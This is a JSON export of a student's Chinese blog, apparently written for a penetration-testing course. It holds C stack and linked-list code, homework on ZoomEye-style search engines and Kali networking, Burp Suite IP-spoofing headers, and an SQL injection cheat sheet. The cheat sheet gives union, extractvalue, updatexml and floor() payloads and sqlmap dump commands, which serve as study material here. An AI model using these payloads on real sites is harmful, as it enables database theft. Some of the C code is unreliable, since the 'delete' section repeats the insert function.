{"meta":{"title":"cQianBlog","subtitle":"","description":"cQian's bolg","author":"cQian","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-12-05T03:43:26.000Z","updated":"2023-12-05T10:16:39.080Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-12-05T03:43:37.000Z","updated":"2023-12-05T10:19:13.443Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"栈","slug":"栈","date":"2023-12-08T09:41:14.018Z","updated":"2023-12-08T10:56:02.578Z","comments":true,"path":"2023/12/08/栈/","permalink":"http://example.com/2023/12/08/%E6%A0%88/","excerpt":"","text":"类型定义123456struct Node&#123; int data; struct Node *next;&#125;; typedef struct Node * PNode;typedef struct Node * top, * LinkStack; 创建空栈1234567LinkStack SetNullStack_link()&#123; LinkStack top=(LinkStack)malloc(sizeof(struct Node)); if(top!=NULL) top-&gt;next=NULL; else printf(&quot;创建空栈失败\\n&quot;); return top;&#125; 判空12345int IsNullStack_Link(LinkStack top)&#123; if(top-&gt;next==NULL) return 1; return 0;&#125; 进栈1234567891011void Push_link(LinkStack top,int x)&#123; PNode p; p=(PNode)malloc(sizeof(struct Node)); if(p==NULL) printf(&quot;进栈创建失败\\n&quot;); else&#123; p-&gt;data=x; p-&gt;next=top-&gt;next; top-&gt;next=p; &#125;&#125; 取栈顶12345int Top_link(LinkStack top) &#123; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else return top-&gt;next-&gt;data; &#125; 出栈12345678910void Pop_link(LinkStack top)&#123; PNode p; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else&#123; p=top-&gt;next; top-&gt;next=p-&gt;next; free(p); &#125;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"链表","slug":"链表","date":"2023-12-08T07:59:27.246Z","updated":"2023-12-08T08:44:25.250Z","comments":true,"path":"2023/12/08/链表/","permalink":"http://example.com/2023/12/08/%E9%93%BE%E8%A1%A8/","excerpt":"","text":"单链表类型定义1234567typedef int DataType;struct Node&#123; DataType data; //数据域 struct Node* next; //指针域 &#125;;typedef struct Node* PNode; //节点类型定义 typedef struct Node* LinkList; //单链表类型定义 创建链表1234567LinkList SetNullList_Link() &#123; LinkList head = (LinkList)malloc(sizeof(struct Node)); if (head != NULL) head-&gt;next = NULL; else printf(&quot;alloc failure&quot;); return head; &#125; 头插法12345678910111213141516void CreateList_Head(struct Node* head) //用头插法创建单链表 &#123; PNode p=NULL; //临时使用 int data; printf(&quot; 头插法，请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //对数据域赋值 p -&gt;next = head -&gt;next; //对next域赋值 head -&gt; next =p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 尾插法123456789101112131415161718void CreateList_Tail(struct Node* head) //用尾插法建立链表 &#123; struct Node* p=NULL; struct Node* q=head; int data; printf(&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //数据域赋值 p -&gt;next =NULL; //指针域赋值 q -&gt;next =p; q=p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 输出链表123456789void print(LinkList head)&#123; PNode p=head -&gt; next; while(p) &#123; printf(&quot;%d\\n&quot;,p -&gt; data); p=p-&gt;next; &#125; 插入算法1234567891011121314151617181920212223//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素int InsertPost_link(LinkList llist,DataType x,DataType y)&#123; PNode p =llist; PNode Newp=(PNode)malloc(sizeof(struct Node)); Newp -&gt; data=y; Newp -&gt; next =NULL; while(p!=NULL)&#123; if (p -&gt; data==x) &#123; Newp -&gt; next=p -&gt; next; p -&gt;next =Newp; return 1; &#125; else&#123; p=p -&gt;next; &#125; &#125; printf(&quot;not exist data %d\\n&quot;,x); return 1;&#125; 删除算法12345678910111213141516171819void DelNode_Link(LinkList head,int deldata)&#123; if(head==NULL)return 1; PNode prees=head; PNode current=head -&gt; next; while(current)&#123; if(current -&gt; data == deldata) &#123; prees -&gt; next = current -&gt; next; free(current); return 1; &#125; else &#123; prees=current; current=current -&gt;next; &#125; &#125; printf(&quot;not exist %d\\n&quot;,deldata);&#125; 循环链表123456789101112131415161718//将尾结点连接到头结点PNode buildCircularLinkedList(int n, PNode tail)&#123; PNode current=NULL, prev; prev = tail; for (int i = 0; i &lt; n; i++) &#123; current = (PNode)malloc(sizeof(Node)); current-&gt;next = NULL; scanf(&quot;%d&quot;, &amp;current-&gt;data); prev-&gt;next = current; prev = current; &#125; current-&gt;next = tail-&gt;next; tail-&gt;next = current; return tail;&#125; 双链表类型定义1234567struct Node&#123; int data; struct Node* pre; struct Node* next;&#125;;typedef struct Node* LinkList;typedef struct Node* PNode; 创建链表12345678LinkList SetList_Link()&#123; LinkList head=(LinkList)malloc(sizeof(struct Node)); head-&gt;data=0; head-&gt;pre=NULL; head-&gt;next=NULL; return head;&#125; 头插法123456789101112void HeadInsert(LinkList head,int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;pre = head; newNode-&gt;next = head-&gt;next; if(head-&gt;next != NULL) &#123; head-&gt;next-&gt;pre = newNode; &#125; head-&gt;next = newNode; &#125; 尾插法12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 输出链表12345678910void PrintList(LinkList head)&#123; LinkList PrintList=head-&gt;next; while(PrintList) &#123; printf(&quot;%d-&gt;&quot;,PrintList-&gt;data); PrintList=PrintList-&gt;next; &#125; printf(&quot;NULL\\n&quot;);&#125; 删除12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 插入算法1234567891011121314151617181920212223void InsertAfterElement(LinkList head, int target, int data)&#123; PNode p = head-&gt;next; while (p != NULL) &#123; if (p-&gt;data == target) &#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = p-&gt;next; if (p-&gt;next != NULL) &#123; p-&gt;next-&gt;pre = newNode; &#125; newNode-&gt;pre = p; p-&gt;next = newNode; head-&gt;data++; return; &#125; p = p-&gt;next; &#125; printf(&quot;Target element not found\\n&quot;);&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"作业No2","slug":"作业2","date":"2023-12-06T03:17:46.631Z","updated":"2023-12-08T07:03:03.745Z","comments":true,"path":"2023/12/06/作业2/","permalink":"http://example.com/2023/12/06/%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"题目汇总1.与ZoomEye功能类似的搜索引擎还有哪些？ 2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。 3.子域名收集，截图。 题目1与ZoomEye功能类似的搜索引擎还有哪些？ 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括： Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。 BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。 Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。 Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。 题目2利用ZoomEye进行相关搜索，截图，发布到自己的Blog 回答：搜索 领势 Compact Wireless-G 网络视频摄像机 http服务器 题目3子域名收集，截图。 回答：搜索 百度 的子域名","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"作业No1","slug":"作业1","date":"2023-12-05T05:32:57.310Z","updated":"2023-12-08T07:02:51.086Z","comments":true,"path":"2023/12/05/作业1/","permalink":"http://example.com/2023/12/05/%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"题目汇总1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？3、对于1、2的结果，进行总结分析。注：网络配置发生变化，建议重启网卡（操作命令见PPT）作业发布到自己blog备查。 题目1Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：不能 题目2Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：能 题目3对于1、2的结果，进行总结分析。 回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"burpsuit使用","slug":"burpsuite使用","date":"2023-11-22T05:31:01.277Z","updated":"2023-12-08T11:10:27.879Z","comments":true,"path":"2023/11/22/burpsuite使用/","permalink":"http://example.com/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"更改数据包get请求将请求改为如下 post请求使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded 伪造IP随便加一行： X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 伪造浏览器和设备修改User-Agent 伪造网址修改referer 密码爆破","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQL注入","slug":"sql注入","date":"2023-11-20T05:58:04.625Z","updated":"2023-12-08T11:02:18.358Z","comments":true,"path":"2023/11/20/sql注入/","permalink":"http://example.com/2023/11/20/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"MySQL操作登陆：1mysql -u [用户名] -p 查询用户名所有数据库：1show databases; 创建数据库：1create database [数据库名]； 删除数据库：1drop database [数据库名] ; 使用数据库：1use [数据库名]; 查询数据库中的表：show tables; 创建表：123456789create table [表名](id int;name varchar(40);) 更改数据表名：1rename table [原数据表名] to [新数据表名] 向数据表中插入数据：1insert into [数据表名] (id ,name,age) values (1,&quot;tom&quot; 19); 向数据表中擦插入新的列：1alter table [数据表名] [列名] [列的数据类型]； 更改数据表中的数据：123update [数据表名] set name=&quot;lisa&quot; where id=1;--修改id=1的行name为lisa 删除数据表中的列：1alter table [数据表名] drop [列名] 删除数据表中的行：123delete from [数据表名] where id=1;--删除id=1的行 查询数据表的包涵数据：123select *from [数据表名] where id in (‘3’)；--在数据表中查询id中包涵‘3’的数据 联合查询：123select country from [数据表名1] union select country from [数据表名2] order country;--查询数据表1和数据表2中不同的country 排序：123select * from users order by age asc;--asc升序，desc降序 注入：数字&#x2F;字符型注入：判断：1id=2-1 查询网站所用数据表列数：123select * from users where id=1 order by x;--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数 查询网站所用数据数据库123select * from users where id=&#x27;0&#x27; union select 1,2,database(),4;--select 后面的数量要与users列数相同 使用：1select schema_name from information_schema.schemata（查库） 1select table_name from information_schema.tables where table_schema=库名（查表) 1select column_name from information_schema.colums where table_name=表名（查列） 1select 列名 from 库名.表名（查数据) 报错注入extractvalue1234567查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) ① 0x7e&#x3D;’’ ② concat(‘a’,‘b’)&#x3D;“ab” ③ version()&#x3D;@@version ④ ‘‘可以换成’#’、’$’等不满足xpath格式的字符 ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 updatexml1234567爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) floor()：1234567爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a sqlmap使用：1、查看所有「数据库」 sqlmap -u ‘http://xx/?id=1‘ –dbs 2.查看「数据表」 sqlmap -u ‘http://xx/?id=1‘ -D [数据库名] –tables 3.查看「数据」 sqlmap -u ‘http://xx/?id=1‘ -D [数据库名] -T [数据库表名] –dump","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}